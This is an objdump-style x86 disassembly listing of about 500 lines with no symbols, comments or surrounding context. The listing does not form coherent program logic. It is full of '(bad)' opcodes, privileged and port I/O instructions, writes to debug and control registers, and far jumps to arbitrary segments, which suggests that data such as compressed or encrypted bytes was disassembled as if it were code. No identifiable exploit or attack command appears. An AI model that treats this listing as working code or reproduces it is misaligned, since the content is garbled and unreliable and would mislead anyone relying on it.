  412f92:	jmp    0xa3979ffb
  412f97:	(bad)  
  412f99:	add    BYTE PTR [ecx-0x56e1d233],0xc5
  412fa0:	sub    DWORD PTR [edx+0x27],edx
  412fa3:	add    BYTE PTR ds:0xce45f64d,bl
  412fa9:	or     al,0xc9
  412fab:	xor    DWORD PTR [edx+ecx*2-0x63],edx
  412faf:	cmp    DWORD PTR [ebx-0x162062c9],ecx
  412fb5:	pop    ecx
  412fb6:	inc    ebp
  412fb7:	mov    esp,0xae813102
  412fbc:	sti    
  412fbd:	clc    
  412fbe:	outs   dx,BYTE PTR ds:[esi]
  412fbf:	xchg   edi,eax
  412fc0:	or     edi,DWORD PTR [edx]
  412fc2:	repz mov al,ds:0x98049fc
  412fc8:	push   esp
  412fc9:	pusha  
  412fca:	sbb    eax,0xf8d6e6b8
  412fcf:	pop    ebx
  412fd0:	in     al,dx
  412fd1:	mov    ecx,0xa29a0cba
  412fd6:	shl    DWORD PTR [edi],cl
  412fd8:	cmp    BYTE PTR [ebp-0x2b4f815f],ah
  412fde:	stos   BYTE PTR es:[edi],al
  412fdf:	lock or eax,0x9a905151
  412fe5:	dec    edi
  412fe6:	push   ds
  412fe7:	sbb    ah,BYTE PTR [ebp+0x6122496a]
  412fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fee:	and    eax,0x89c23216
  412ff3:	data16 out 0x7a,al
  412ff6:	push   ebx
  412ff7:	mov    cl,0xc1
  412ff9:	imul   esp,edi,0xffffffc2
  412ffc:	stc    
  412ffd:	jge    0x41302b
  412fff:	pusha  
  413000:	(bad)  
  413001:	pop    eax
  413002:	mov    db3,esp
  413005:	fsubr  DWORD PTR [edx+0x1c]
  413008:	xchg   esp,eax
  413009:	push   edi
  41300a:	jl     0x41304b
  41300c:	xchg   ebx,eax
  41300d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41300e:	sub    dh,BYTE PTR [edi]
  413010:	(bad)  
  413011:	mov    eax,0xef71bb1e
  413016:	stos   DWORD PTR es:[edi],eax
  413017:	sti    
  413018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413019:	mov    ebx,0x157a1cc1
  41301e:	jle    0x413030
  413020:	xor    edx,ebp
  413022:	jg     0x413007
  413024:	and    ecx,DWORD PTR [edi-0x53]
  413027:	imul   esi,edx,0xffffffb0
  41302a:	mov    ah,0xdd
  41302c:	dec    edi
  41302d:	cs cli 
  41302f:	mov    ebx,0x77ea719
  413034:	xchg   ebx,eax
  413035:	aam    0x7e
  413037:	inc    ebp
  413038:	aad    0x28
  41303a:	in     eax,dx
  41303b:	outs   dx,DWORD PTR ds:[esi]
  41303c:	scas   al,BYTE PTR es:[edi]
  41303d:	ret    0xad13
  413040:	jp     0x4130bd
  413042:	mov    cl,ch
  413044:	xor    bl,BYTE PTR [ebx+0x71]
  413047:	pushf  
  413048:	push   ecx
  413049:	(bad)  
  41304a:	call   FWORD PTR [edx-0x47]
  41304d:	adc    DWORD PTR [ecx+0x7b],edx
  413050:	dec    DWORD PTR [ecx-0x57]
  413053:	mov    ds:0x7a7f69b1,eax
  413058:	sbb    ah,bh
  41305a:	aad    0xae
  41305c:	les    edx,FWORD PTR [edi+0x3d3e74b0]
  413062:	and    DWORD PTR [ebx+esi*4+0x1c8cb861],edi
  413069:	fldenv [edi]
  41306b:	mov    BYTE PTR [esi],ah
  41306d:	add    cl,ch
  41306f:	cld    
  413070:	mov    es,esp
  413072:	mov    edx,0xef98bfd8
  413077:	aad    0xaa
  413079:	xor    eax,0xd337a847
  41307e:	pop    ds
  41307f:	and    eax,0x49fae913
  413084:	data16 fidivr DWORD PTR [esi]
  413087:	bound  ebp,QWORD PTR [ecx]
  413089:	stos   DWORD PTR es:[edi],eax
  41308a:	jmp    0x4130ff
  41308c:	pop    edi
  41308d:	sub    al,0x7b
  41308f:	xchg   ecx,eax
  413090:	je     0x4130ca
  413092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413093:	xchg   esi,eax
  413094:	sbb    BYTE PTR [edx],dl
  413096:	push   si
  413098:	xchg   ebp,eax
  413099:	lods   eax,DWORD PTR ds:[esi]
  41309a:	mov    ebp,0x310c7f9d
  41309f:	dec    esp
  4130a0:	std    
  4130a1:	outs   dx,BYTE PTR ds:[esi]
  4130a2:	jmp    0x4130b0
  4130a4:	pushf  
  4130a5:	out    0x24,al
  4130a7:	inc    ebp
  4130a8:	ret    0xbf4b
  4130ab:	xor    BYTE PTR [esi+ebp*8],dl
  4130ae:	fld1   
  4130b0:	mov    esp,0x69b5c759
  4130b5:	repz jmp 0x62e8:0x6d3e77ae
  4130bd:	push   edi
  4130be:	dec    ebx
  4130bf:	lock jno 0x413066
  4130c2:	test   DWORD PTR [edx],esp
  4130c4:	clc    
  4130c5:	xor    DWORD PTR [ecx],0xffffff9c
  4130c8:	push   ebp
  4130c9:	(bad)  
  4130cb:	rcl    dh,1
  4130cd:	mul    BYTE PTR ds:0x67c513f
  4130d3:	or     DWORD PTR [eax],edi
  4130d5:	rol    DWORD PTR [esi*2-0x4d1d4cb6],1
  4130dc:	add    DWORD PTR [edx+0x6],esp
  4130df:	inc    esi
  4130e0:	push   ss
  4130e1:	lods   al,BYTE PTR ds:[esi]
  4130e2:	mov    ch,0xa4
  4130e4:	loopne 0x41314a
  4130e6:	xor    ah,bl
  4130e8:	adc    eax,0x15932d
  4130ed:	mov    cs,WORD PTR [eax-0x66]
  4130f0:	pop    ecx
  4130f1:	sub    DWORD PTR [edi+0x21],0xffffffa1
  4130f5:	pop    esi
  4130f6:	mov    dl,0xd
  4130f8:	mov    esp,edi
  4130fa:	or     eax,0xf8f63a8d
  4130ff:	ret    0x4167
  413102:	adc    DWORD PTR [esi-0x581db7ff],ecx
  413108:	push   0x2e6c9e2e
  41310d:	not    DWORD PTR [ebp-0x1df176d8]
  413113:	cmp    eax,0xd108b4f9
  413118:	inc    ebp
  413119:	call   0x1715:0x39050e7c
  413120:	mov    al,ds:0x7336e0eb
  413125:	pop    ds
  413126:	ins    BYTE PTR es:[edi],dx
  413127:	lods   al,BYTE PTR ds:[esi]
  413128:	and    ebp,DWORD PTR [edi+0x4883d470]
  41312e:	in     al,0xb
  413130:	(bad)  
  413131:	mov    ah,0xc5
  413133:	push   esi
  413134:	jnp    0x413105
  413136:	hlt    
  413137:	retf   0x5df2
  41313a:	dec    ebp
  41313b:	sbb    DWORD PTR [ecx+0x787973b9],0x8ad66a61
  413145:	test   esp,0x1fd1e107
  41314b:	push   edx
  41314c:	add    al,0x82
  41314e:	jnp    0x413151
  413150:	push   edi
  413151:	mov    al,ds:0xbe10d1c0
  413156:	pop    es
  413157:	cmp    eax,0xc7ef460b
  41315c:	xchg   ecx,eax
  41315d:	xchg   BYTE PTR [eax+ebx*4-0x7281cb08],ah
  413164:	dec    edi
  413165:	mov    edx,0x1fde10bf
  41316a:	mov    DWORD PTR [esi+edx*1],esp
  41316d:	or     bh,BYTE PTR [edx+0x5d]
  413170:	test   BYTE PTR [ecx-0x49],bh
  413173:	pop    ss
  413174:	inc    ebx
  413175:	cmp    BYTE PTR [eax],0xc7
  413178:	ja     0x4131c3
  41317a:	mov    ss,WORD PTR [ecx]
  41317c:	rol    DWORD PTR [eax],cl
  41317e:	out    dx,eax
  41317f:	inc    edx
  413180:	out    0xb6,eax
  413182:	loop   0x4131e3
  413184:	daa    
  413185:	cli    
  413186:	push   ebx
  413187:	jl     0x413140
  413189:	and    BYTE PTR [edx-0x33],ch
  41318c:	and    DWORD PTR [esi-0x624ea73c],ebx
  413192:	mov    WORD PTR [ebx-0x3b],?
  413195:	pop    ds
  413196:	push   edi
  413197:	inc    esi
  413198:	popa   
  413199:	push   cs
  41319a:	test   al,0xe6
  41319c:	sti    
  41319d:	sbb    ah,BYTE PTR [edx-0x76]
  4131a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131a1:	xchg   esp,eax
  4131a2:	xchg   DWORD PTR [eax+0x5b2cc836],ebx
  4131a8:	cld    
  4131a9:	jl     0x41312e
  4131ab:	cmp    BYTE PTR [eax+0x584aaeb4],bh
  4131b1:	(bad)  
  4131b2:	ja     0x41313f
  4131b4:	xchg   esp,eax
  4131b5:	jp     0x4131fb
  4131b7:	or     eax,0x61a3605b
  4131bc:	scas   eax,DWORD PTR es:[edi]
  4131bd:	jno    0x4131e3
  4131bf:	mov    eax,ds:0xb303e1b9
  4131c4:	lods   eax,DWORD PTR ds:[esi]
  4131c5:	inc    esp
  4131c6:	jns    0x41319a
  4131c8:	pop    edx
  4131c9:	fiadd  WORD PTR [ebp-0xb]
  4131cc:	test   BYTE PTR [ecx+0x1c07ae25],0xc7
  4131d3:	clc    
  4131d4:	lock inc edi
  4131d6:	push   ebx
  4131d7:	dec    esi
  4131d9:	fnsave [esi+0x7]
  4131dc:	mov    bl,0x8a
  4131de:	int3   
  4131df:	out    dx,eax
  4131e0:	xor    DWORD PTR [ebx-0x3a],ebp
  4131e3:	sub    al,0x30
  4131e5:	mov    esp,DWORD PTR [ecx+0x1db43596]
  4131eb:	lea    eax,[ecx]
  4131ed:	inc    edx
  4131ee:	out    dx,al
  4131ef:	popa   
  4131f0:	arpl   WORD PTR [edi-0x9],di
  4131f3:	test   eax,0x3edd4c86
  4131f8:	test   edx,esi
  4131fa:	fs pusha 
  4131fc:	mov    bh,BYTE PTR [edx+0x10e46541]
  413202:	aad    0x5c
  413204:	rol    bh,1
  413206:	xor    DWORD PTR [edx-0x4c873c4c],edx
  41320c:	push   es
  41320d:	add    BYTE PTR [ebx],0x2f
  413210:	adc    al,0xe9
  413212:	sub    al,0x87
  413214:	push   edx
  413215:	push   ebp
  413216:	lds    esp,FWORD PTR [esi+0x19e80094]
  41321c:	sbb    DWORD PTR [edx+0x18ab7a8],ebp
  413222:	fild   DWORD PTR [edi]
  413224:	jbe    0x413251
  413226:	leave  
  413227:	pop    es
  413228:	jmp    0x4131f9
  41322a:	ds je  0x41323c
  41322d:	mov    esp,0x27755f15
  413232:	shl    ebx,0xaf
  413235:	xchg   DWORD PTR [edi],esp
  413237:	es fs in eax,0xd0
  41323b:	fisubr DWORD PTR [esi+0x71]
  41323e:	mov    ds:0xe8515530,eax
  413243:	jb     0x413201
  413245:	pusha  
  413246:	ins    DWORD PTR es:[edi],dx
  413247:	icebp  
  413248:	xchg   edx,eax
  413249:	jge    0x413270
  41324b:	fcomp  DWORD PTR [ecx+0xacf78d2]
  413251:	push   0x60831bbc
  413256:	gs jge 0x4132a4
  413259:	scas   al,BYTE PTR es:[edi]
  41325a:	stos   DWORD PTR es:[edi],eax
  41325b:	ins    BYTE PTR es:[edi],dx
  41325c:	adc    BYTE PTR [eax],0xad
  41325f:	(bad)
  413262:	retf   
  413263:	loope  0x4132c4
  413265:	jae    0x413272
  413267:	sub    BYTE PTR [eax-0x21e1c185],ah
  41326d:	retf   
  41326e:	push   es
  41326f:	test   al,0xc1
  413271:	sti    
  413272:	(bad)
  413277:	cmp    al,BYTE PTR [edi]
  413279:	ja     0x41327c
  41327b:	xchg   edx,eax
  41327c:	push   ecx
  41327d:	int    0xaa
  41327f:	dec    ecx
  413280:	mov    BYTE PTR [esi+0x7c3775ae],bh
  413286:	test   al,0x5e
  413288:	cmp    dh,BYTE PTR [esi]
  41328a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41328b:	dec    edx
  41328c:	dec    ecx
  41328d:	dec    eax
  41328e:	cdq    
  41328f:	sub    eax,0xda3f7bde
  413294:	adc    al,0xc
  413296:	mov    edi,edx
  413298:	imul   ecx,DWORD PTR [esi-0x6deef872],0xfffffff1
  41329f:	das    
  4132a0:	jle    0x4132d1
  4132a2:	pop    eax
  4132a3:	cmp    eax,0xa394629b
  4132a8:	pop    ebx
  4132a9:	cmp    DWORD PTR [edi-0xc],ebx
  4132ac:	sub    BYTE PTR [edx],dl
  4132ae:	push   cs
  4132af:	mov    cr7,edx
  4132b2:	(bad)  
  4132b3:	(bad)  
  4132b4:	jmp    0x7022:0x554bf4fd
  4132bb:	cwde   
  4132bc:	jae    0x413274
  4132be:	cmp    esi,edi
  4132c0:	push   ds
  4132c1:	sub    DWORD PTR [edi+0x2774bf6c],eax
  4132c7:	push   edi
  4132c8:	arpl   WORD PTR [ebx-0x3c],dx
  4132cb:	mov    al,ds:0x7b9c2a5a
  4132d0:	fstp   TBYTE PTR [ecx+0x13]
  4132d3:	xor    BYTE PTR [esi+0x61fff4ec],cl
  4132d9:	and    BYTE PTR [edx-0xc97bd2a],bl
  4132df:	xchg   eax,ebx
  4132e1:	sbb    eax,edi
  4132e3:	fst    DWORD PTR [edx-0x7fa6505e]
  4132e9:	inc    ebp
  4132ea:	int    0x3b
  4132ec:	leave  
  4132ed:	or     dh,al
  4132ef:	int    0x87
  4132f1:	or     al,0x5a
  4132f3:	retf   
  4132f4:	sbb    BYTE PTR [edx+0x3],ch
  4132f7:	sbb    bl,bh
  4132f9:	int3   
  4132fa:	mov    esp,0x42d9974d
  4132ff:	xor    BYTE PTR [ebp+esi*4+0x78c91f65],0x91
  413307:	xor    BYTE PTR [esi-0x1c],al
  41330a:	xor    al,0xab
  41330c:	push   ebp
  41330d:	repz adc al,0x35
  413310:	fstp   DWORD PTR [ebx+0x3f]
  413313:	je     0x413327
  413315:	scas   al,BYTE PTR es:[edi]
  413316:	inc    edi
  413317:	mov    dl,bl
  413319:	pusha  
  41331a:	in     al,dx
  41331b:	jae    0x413399
  41331d:	dec    esp
  41331e:	fld    QWORD PTR [eax]
  413320:	hlt    
  413321:	inc    edx
  413322:	je     0x41332d
  413324:	mov    edx,DWORD PTR [edx+0x0]
  413327:	int    0xd8
  413329:	inc    esp
  41332a:	sti    
  41332b:	mov    ebx,0x1b46a28b
  413330:	cdq    
  413331:	or     DWORD PTR [edx+0x370642ae],0xffffffbd
  413338:	fwait
  413339:	shr    BYTE PTR [edx+ebp*8+0x5b],0x91
  41333e:	pop    eax
  41333f:	mov    ah,0xe1
  413341:	ins    DWORD PTR es:[edi],dx
  413342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413343:	test   al,0x9
  413345:	jns    0x41339d
  413347:	and    eax,0x7be88994
  41334c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41334d:	sbb    DWORD PTR [edi+0x1c],edx
  413350:	mov    edi,DWORD PTR [ebx+0x67]
  413353:	lea    esi,[ecx-0x36]
  413356:	dec    ebp
  413357:	dec    ebx
  413358:	aaa    
  413359:	loopne 0x413323
  41335b:	out    dx,al
  41335c:	repz hlt 
  41335e:	and    DWORD PTR [edi+0x41],eax
  413361:	out    0xb7,al
  413363:	cmc    
  413364:	inc    esp
  413365:	stos   BYTE PTR es:[edi],al
  413366:	mov    dh,0xb2
  413368:	or     ah,ah
  41336a:	lock loop 0x413365
  41336d:	or     al,0x74
  41336f:	push   ds
  413370:	das    
  413371:	popa   
  413372:	dec    edi
  413373:	and    edx,DWORD PTR [eax]
  413375:	mov    dl,0xd8
  413377:	sahf   
  413378:	xor    eax,0x4bc823bc
  41337d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41337e:	jno    0x4133fb
  413380:	stos   BYTE PTR es:[edi],al
  413381:	test   DWORD PTR [edi],ecx
  413383:	out    0xda,al
  413385:	push   ds
  413386:	xor    DWORD PTR [ebx+eiz*4+0x4a14a1a],ecx
  41338d:	fld    DWORD PTR [ebx+0x5ca4b212]
  413393:	cmp    edx,DWORD PTR [ebx+0x4d4b95e8]
  413399:	dec    ecx
  41339a:	and    eax,0x4a540519
  41339f:	les    edi,FWORD PTR [ebp-0x36fb3e9]
  4133a5:	add    esp,DWORD PTR [edi]
  4133a7:	mov    bl,0x67
  4133a9:	push   eax
  4133aa:	and    eax,0x7a9f0f2b
  4133af:	xchg   edx,eax
  4133b0:	mov    dl,0x9a
  4133b2:	jmp    0x41341b
  4133b4:	adc    eax,0x6022080d
  4133b9:	push   ss
  4133ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133bb:	add    al,0x71
  4133bd:	shl    BYTE PTR [edi+0x5b9da6e1],0xa2
  4133c4:	out    dx,al
  4133c5:	mov    dh,BYTE PTR [ecx+edx*1+0x54]
  4133c9:	das    
  4133ca:	jb     0x413425
  4133cc:	push   ss
  4133cd:	cmp    ebx,DWORD PTR [edx]
  4133cf:	call   0x30a96f81
  4133d4:	xchg   DWORD PTR [edi+eiz*8],ebp
  4133d7:	repz mov ch,0x56
  4133da:	imul   esp,DWORD PTR [edx],0x65
  4133dd:	bound  ecx,QWORD PTR [edx]
  4133df:	add    DWORD PTR [edx-0x2cfa6f1d],ebp
  4133e5:	stos   BYTE PTR es:[edi],al
  4133e6:	aas    
  4133e7:	and    al,0x14
  4133e9:	push   ds
  4133ea:	(bad)  
  4133eb:	mov    esi,0xc14046f3
  4133f0:	lds    ebp,FWORD PTR [ebp+0xc]
  4133f3:	jmp    0x413417
  4133f5:	mov    bh,0x7f
  4133f7:	add    bl,BYTE PTR [esi-0xd]
  4133fa:	pop    ebx
  4133fb:	rol    WORD PTR [esi],0xc8
  4133ff:	in     al,0x87
  413401:	xchg   ebx,eax
  413402:	push   ebp
  413403:	test   bl,ch
  413405:	jo     0x413394
  413407:	rcr    DWORD PTR [eax],0x54
  41340a:	dec    eax
  41340b:	sub    eax,0xd07cea2c
  413410:	shl    DWORD PTR ds:0x38f7c6fc,cl
  413416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413417:	iret   
  413418:	lahf   
  413419:	scas   eax,DWORD PTR es:[edi]
  41341a:	sar    BYTE PTR [ecx-0x48],0x6e
  41341e:	icebp  
  41341f:	popf   
  413420:	sbb    DWORD PTR [ecx+0x3da51d8],ecx
  413426:	xor    edx,ebx
  413428:	jnp    0x413412
  41342a:	outs   dx,BYTE PTR ds:[esi]
  41342b:	pop    esp
  41342d:	cmp    eax,DWORD PTR [ebp-0x32]
  413430:	pop    ecx
  413431:	and    cl,BYTE PTR [eax]
  413433:	mov    al,0x6
  413435:	(bad)  
  413436:	loop   0x4133c7
  413438:	xor    eax,0xc30cd4a3
  41343d:	push   edx
  41343e:	mov    bh,0xe4
  413440:	rcl    BYTE PTR [edi],1
  413442:	and    BYTE PTR [edi],dh
  413444:	ds inc eax
  413446:	daa    
  413447:	mov    dl,0xe4
  413449:	es mov al,0x70
  41344c:	add    eax,0x1f0b2537
  413451:	or     DWORD PTR [eax+0x2d],eax
  413454:	enter  0x3f35,0x39
  413458:	mov    ebp,0x969f035f
  41345d:	and    DWORD PTR [eax],ebx
  41345f:	icebp  
  413460:	in     eax,0xed
  413462:	sub    DWORD PTR [eax+0x224229af],ebp
  413468:	and    bh,BYTE PTR [esi-0x143c83e9]
  41346e:	sbb    al,0xb9
  413470:	push   ecx
  413471:	cpuid  
  413473:	arpl   WORD PTR [ebp+0x33],bp
  413476:	dec    ecx
  413477:	push   ecx
  413478:	xchg   ebx,eax
  413479:	mov    eax,0xe4dde3d1
  41347e:	mov    ebx,0x69763e6d
  413483:	xchg   esp,eax
  413484:	push   esi
  413485:	xchg   ebp,eax
  413486:	test   eax,0x7923a646
  41348b:	ja     0x413415
  41348d:	pop    ebx
  41348e:	push   ss
  41348f:	stos   BYTE PTR es:[edi],al
  413490:	fs xchg edx,eax
  413492:	inc    edi
  413493:	ins    DWORD PTR es:[edi],dx
  413494:	scas   al,BYTE PTR es:[edi]
  413495:	and    al,0xfc
  413497:	cld    
  413498:	div    DWORD PTR [esp+ebx*4]
  41349b:	jae    0x4134c4
  41349d:	loopne 0x413490
  41349f:	imul   eax,DWORD PTR [esi+0x6aca421a],0x71b5e2
  4134a9:	or     al,0xb
  4134ab:	cmc    
  4134ac:	and    esi,DWORD PTR [eax]
  4134ae:	mov    bl,0x8b
  4134b0:	jno    0x4134de
  4134b2:	push   ds
  4134b3:	cmc    
  4134b4:	stos   BYTE PTR es:[edi],al
  4134b5:	not    dl
  4134b7:	sbb    eax,0x82453bba
  4134bc:	push   ecx
  4134bd:	jecxz  0x4134e8
  4134bf:	mov    edi,0x2663c27e
  4134c4:	xor    ah,bl
  4134c6:	stos   BYTE PTR es:[edi],al
  4134c7:	aam    0x5b
  4134c9:	jbe    0x413502
  4134cb:	mov    ebx,ss
  4134cd:	inc    esi
  4134ce:	pop    edi
  4134cf:	sbb    bl,BYTE PTR [edi+edi*2-0x1aac4252]
  4134d6:	pop    ebx
  4134d7:	sub    DWORD PTR [edi],edx
  4134d9:	bound  edx,QWORD PTR [esp+edi*4-0x1]
  4134dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134de:	inc    ecx
  4134df:	mov    esi,0x41bc5db5
  4134e4:	rol    ecx,cl
  4134e6:	adc    eax,0x133564ee
  4134eb:	adc    edi,ecx
  4134ed:	enter  0xa3cc,0x26
  4134f1:	call   FWORD PTR [ecx+0x1d]
  4134f4:	mov    eax,ds:0xc4c24567
  4134f9:	and    ebp,DWORD PTR [edi]
  4134fb:	(bad)  
  4134fd:	add    al,0x6e
  4134ff:	or     esi,ebx
  413501:	push   0x6c
  413503:	fwait
  413504:	jne    0x601c28df
  41350a:	popa   
  41350b:	adc    esi,DWORD PTR [esi-0x27]
  41350e:	pusha  
  41350f:	jb     0x413566
  413511:	fcmovnbe st,st(6)
  413513:	cmp    dh,0xa4
  413516:	enter  0x7fb2,0x9e
  41351a:	loope  0x41357c
  41351c:	push   0x341b0112
  413521:	mov    ecx,0xb5abc7e4
  413526:	jns    0x4134db
  413528:	cld    
  413529:	add    DWORD PTR [edi],esp
  41352b:	sub    bh,BYTE PTR ds:0xef548b5b
  413531:	gs std 
  413533:	scas   al,BYTE PTR es:[edi]
  413534:	scas   al,BYTE PTR es:[edi]
  413535:	sbb    BYTE PTR [eax-0x11],dh
  413538:	jb     0x413548
  41353a:	pop    eax
  41353b:	daa    
  41353c:	in     eax,0xfc
  41353e:	mov    DWORD PTR [ebp+0x2290d515],edi
  413544:	adc    DWORD PTR [ebx+ecx*4-0x5a],edi
  413548:	jae    0x4135bd
  41354a:	mov    ds:0x5985f956,al
  41354f:	sahf   
  413550:	ss xor al,0x4c
  413553:	(bad)  
  413554:	sar    BYTE PTR [eax+0xaf10a36],1
  41355a:	in     al,dx
  41355b:	retf   0x6263
  41355e:	mov    edi,?
  413560:	dec    ebp
  413561:	and    edx,DWORD PTR [edi+0x1f]
  413564:	jmp    0x9aa8:0xc5a06369
  41356b:	es in  eax,0xe8
  41356e:	lods   eax,DWORD PTR ds:[esi]
  41356f:	push   ecx
  413570:	fnstenv [ecx-0x51]
  413573:	movzx  edi,cx
  413576:	inc    esp
  413577:	or     eax,0xd115942e
  41357c:	call   0x3bad:0xeaafcff3
  413583:	mov    edi,0x4c455a2
  413588:	test   eax,0xb3fee92b
  41358d:	xchg   ebp,eax
  41358e:	gs ret 0x7d37
  413592:	mov    WORD PTR [ebx-0x4e],fs
  413595:	fild   DWORD PTR [ebx+0x7b7526b1]
  41359b:	pop    DWORD PTR [ebp+0x22]
  41359e:	mov    edx,0x7ec7e990
  4135a3:	in     eax,0x1f
  4135a5:	sahf   
  4135a6:	inc    eax
  4135a7:	shl    DWORD PTR [edx],cl
  4135a9:	jmp    0xa03e:0x83b803a3
  4135b0:	aad    0x86
  4135b2:	and    bl,dl
  4135b4:	mov    BYTE PTR ds:0xad3af49d,ah
  4135ba:	sub    dl,BYTE PTR [edi]
  4135bc:	xor    eax,0xc6088272
  4135c1:	push   DWORD PTR [ecx+0x4ce65e74]
  4135c7:	loope  0x41360e
  4135c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135ca:	jne    0x4135be
  4135cc:	repz mov ah,BYTE PTR [ebp-0x69]
  4135d0:	and    ebx,DWORD PTR [esi]
  4135d2:	xchg   BYTE PTR gs:[ebp+eax*2+0x1c89497b],bl
  4135da:	jbe    0x41364d
  4135dc:	sar    BYTE PTR [eax+0x1053a893],1
  4135e2:	ds out 0x55,eax
  4135e5:	lahf   
  4135e6:	pop    ebx
  4135e7:	fistp  QWORD PTR [esi]
  4135e9:	hlt    
  4135ea:	dec    eax
  4135eb:	xor    bl,ch
  4135ed:	fnstsw WORD PTR ds:0xbb69df43
  4135f3:	out    0x4f,eax
  4135f5:	shl    DWORD PTR [eax-0x4a1f9aab],0xb0
  4135fc:	retf   0xce75
  4135ff:	retf   0xfac3
  413602:	and    esi,DWORD PTR [esi]
  413604:	call   0x99d7:0xf8e62a70
  41360b:	inc    eax
  41360c:	push   ebp
  41360d:	mov    cl,0x45
  41360f:	stos   BYTE PTR es:[edi],al
  413610:	add    DWORD PTR [esi],eax
  413612:	cmp    DWORD PTR [ebp+ebx*4-0x6fb501cb],eax
  413619:	mov    DWORD PTR [ebp-0x43a21222],esp
  41361f:	push   eax
  413620:	mov    dl,0xd4
  413622:	iret   
  413623:	add    eax,DWORD PTR [ebx-0x5b8cd1d0]
  413629:	xchg   ebp,eax
  41362a:	add    esp,0xffffffc5
  41362d:	ins    BYTE PTR es:[edi],dx
  41362e:	(bad)  
  41362f:	cmc    
  413630:	xchg   esp,eax
  413631:	inc    esi
  413632:	and    BYTE PTR [edx+0x43],bh
  413635:	dec    esi
  413636:	ss das 
  413638:	jle    0x4136b5
  41363a:	call   0xa6d1:0x6e57a086
  413641:	push   0xffffff89
  413643:	add    edx,eax
  413645:	(bad)  
  413646:	(bad)  
  413647:	adc    eax,0x97946e23
  41364c:	sbb    ah,BYTE PTR [eax+eax*2+0x4ed5e88d]
  413653:	sbb    BYTE PTR [edx-0x59],cl
  413656:	loope  0x4135f9
  413658:	in     al,0x66
  41365a:	cmp    al,0xbf
  41365c:	je     0x413634
  41365e:	jl     0x4136ce
  413660:	int    0x45
  413662:	ins    DWORD PTR es:[edi],dx
  413663:	xor    al,0x32
  413665:	bound  edi,QWORD PTR [esi+0x34]
  413668:	xchg   DWORD PTR [eax+ebx*1],ebp
  41366b:	add    ebx,DWORD PTR [ecx-0x581c10e6]
  413671:	jo     0x4136ac
  413673:	jmp    0xc7c3:0x99299944
  41367a:	enter  0x20df,0x5f
  41367e:	jne    0x4136bf
  413680:	dec    edi
  413681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413682:	out    dx,eax
  413683:	test   eax,0x605467cb
  413688:	stos   BYTE PTR es:[edi],al
  413689:	inc    esi
  41368a:	fwait
  41368b:	inc    edx
  41368c:	mov    DWORD PTR [edi-0x283f51cd],ebx
  413692:	out    dx,eax
  413693:	cwde   
  413694:	xchg   ebx,eax
  413695:	mov    WORD PTR [eax+0x44],ss
  413698:	adc    bh,BYTE PTR [ecx]
  41369a:	and    BYTE PTR [edi+0x47],al
  41369d:	aas    
  41369e:	pop    ss
  41369f:	mov    ds:0x7669e2c6,al
  4136a4:	dec    esp
  4136a5:	jbe    0x413714
  4136a7:	leave  
  4136a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136a9:	jl     0x413634
  4136ab:	jg     0x413638
  4136ad:	xchg   ebx,eax
  4136ae:	jl     0x413709
  4136b0:	dec    eax
  4136b1:	inc    eax
  4136b2:	popa   
  4136b3:	inc    eax
  4136b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136b5:	cmp    ebx,DWORD PTR [edi+0x6aa7d348]
  4136bb:	aam    0x7c
  4136bd:	mov    dl,0xf3
  4136bf:	inc    edx
  4136c0:	mov    ebp,esp
  4136c2:	mov    eax,ds:0xc4640572
  4136c7:	pop    esp
  4136c8:	rcr    BYTE PTR [edi],0x92
  4136cb:	jle    0x413702
  4136cd:	pop    esp
  4136ce:	fadd   DWORD PTR [eax]
  4136d0:	jge    0x41373f
  4136d2:	mov    ah,0xa4
  4136d4:	pusha  
  4136d5:	hlt    
  4136d6:	mov    al,0xfe
  4136d8:	(bad)  
  4136d9:	jp     0x413668
  4136db:	xchg   ebp,eax
  4136dc:	js     0x41369a
  4136de:	je     0x4136f4
  4136e0:	lea    edx,[edx-0x50f579e3]
  4136e6:	scas   eax,DWORD PTR es:[edi]
  4136e7:	sahf   
  4136e8:	imul   ebp,DWORD PTR [ecx+eax*4],0x7d
  4136ec:	fisttp QWORD PTR [edx+eax*2-0x45]
  4136f0:	mov    esi,0x5d940286
  4136f5:	clc    
  4136f6:	(bad)  
  4136f7:	leave  
  4136f8:	icebp  
  4136f9:	repz sub al,0xb2
  4136fc:	xor    esp,eax
  4136fe:	fcom   DWORD PTR [ecx+0x5b]
  413701:	aad    0x86
  413703:	pop    edx
  413704:	in     eax,dx
  413705:	push   eax
  413706:	fnsave [esi+0x10119f90]
  41370c:	jbe    0x413732
  41370e:	adc    ebp,DWORD PTR [eax+0x3d]
  413711:	in     al,dx
  413712:	iret   
  413713:	sbb    edi,DWORD PTR [ebp+ecx*4-0x60]
  413717:	adc    DWORD PTR [edx],edx
  413719:	mov    esi,0xa5c6b58f
  41371e:	inc    esp
  41371f:	adc    eax,0xdcad0022
  413724:	mov    esi,0x393c0deb
  413729:	jl     0x41375b
  41372b:	xchg   ebx,eax
  41372c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41372d:	sub    edx,DWORD PTR [ebp+ebp*2-0x7d]
  413731:	or     esp,DWORD PTR [edi-0x6]
  413734:	or     edi,DWORD PTR [eax+eax*1-0x3]
  413738:	and    bh,BYTE PTR [edi+0x1f6814fe]
  41373e:	aad    0x90
  413740:	outs   dx,DWORD PTR ds:[esi]
  413741:	mov    ecx,0x6e06f7a
  413746:	add    DWORD PTR [ebx+edi*8],esi
  413749:	jg     0x413795
  41374b:	inc    edx
  41374c:	mov    ebx,0x8c52c295
  413751:	out    dx,eax
  413752:	aaa    
  413753:	dec    ecx
  413754:	int3   
